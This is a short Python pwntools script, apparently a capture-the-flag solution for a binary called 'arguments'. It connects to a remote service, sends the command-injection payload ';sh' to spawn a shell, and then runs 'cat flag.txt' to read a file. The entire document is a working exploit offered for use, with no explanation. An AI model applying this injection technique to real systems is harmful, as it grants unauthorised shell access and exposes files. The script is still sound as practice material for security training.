#!/usr/bin/env python3
from pwn import *

p = remote("159.65.13.76", 62112)
#p = process("./arguments")

p.recvuntil("ts!")
payload = ";sh"

p.sendline(payload)

p.sendline("cat flag.txt;exit")
p.interactive()